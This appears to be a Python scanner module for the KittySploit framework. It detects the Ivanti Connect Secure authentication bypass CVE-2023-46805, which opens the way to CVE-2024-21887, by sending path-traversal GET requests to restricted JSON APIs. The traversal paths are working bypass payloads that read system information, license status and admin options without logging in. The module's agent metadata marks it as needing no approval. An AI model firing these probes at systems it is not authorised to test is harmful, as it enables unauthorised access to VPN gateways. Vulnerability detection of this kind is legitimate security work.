#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ivanti Connect Secure CVE-2024-21887 surface via CVE-2023-46805 auth bypass."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ivanti Connect Secure CVE-2024-21887 Detection',
        'description': (
            'Detects the CVE-2023-46805 auth-bypass path that enables CVE-2024-21887 '
            'command injection by reading restricted JSON APIs without authentication.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'ivanti', 'connectsecure',
            'rce', 'auth-bypass', 'kev', 'vkev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': ''},
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-21887',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-46805',
            'https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways',
        ],
        'cve': 'CVE-2024-21887',
    }

    def run(self):
        probes = (
            (
                '/api/v1/totp/user-backup-code/../../system/system-information',
                ('build', 'system-information', 'software-inventory'),
            ),
            (
                '/api/v1/totp/user-backup-code/../../license/keys-status',
                ('"result"', '"message"'),
            ),
            (
                '/api/v1/cav/client/status/../../admin/options',
                ('poll_interval', 'block_message'),
            ),
        )
        for path, markers in probes:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            ctype = (r.headers.get('Content-Type') or r.headers.get('content-type') or '').lower()
            if 'application/json' not in ctype and 'json' not in ctype:
                # Some appliances omit precise content-type; still require JSON-looking body.
                body_preview = (r.text or '')[:200].lstrip()
                if not (body_preview.startswith('{') or body_preview.startswith('[')):
                    continue
            body = r.text or ''
            if all(m in body for m in markers):
                self.set_info(
                    severity='critical',
                    reason=(
                        'Ivanti Connect Secure auth bypass (CVE-2023-46805) enables '
                        'CVE-2024-21887 RCE surface'
                    ),
                    path=path,
                    evidence=f'markers={",".join(markers)}',
                )
                return True
        return False
